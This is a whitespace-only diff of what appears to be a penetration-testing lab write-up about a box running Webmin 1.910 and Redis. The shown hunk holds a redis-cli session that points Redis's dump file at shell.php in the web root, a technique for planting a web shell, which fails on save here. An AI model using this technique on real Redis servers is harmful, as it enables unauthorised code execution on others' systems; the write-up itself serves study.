@@ -78,10 +78,10 @@ Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)
   the first requires us to be able to =save= the config which results in an error and the second
   is prevented by =strict_lua_mode=
   #+begin_src bat
-  10.10.10.160:6379> config set dbfilename shell.php                                                                    
-OK                              
-  10.10.10.160:6379> config set dir /var/www/html            
-OK                            
+  10.10.10.160:6379> config set dbfilename shell.php
+OK
+  10.10.10.160:6379> config set dir /var/www/html
+OK
   10.10.10.160:6379> save
 (error) ERR
   #+end_src
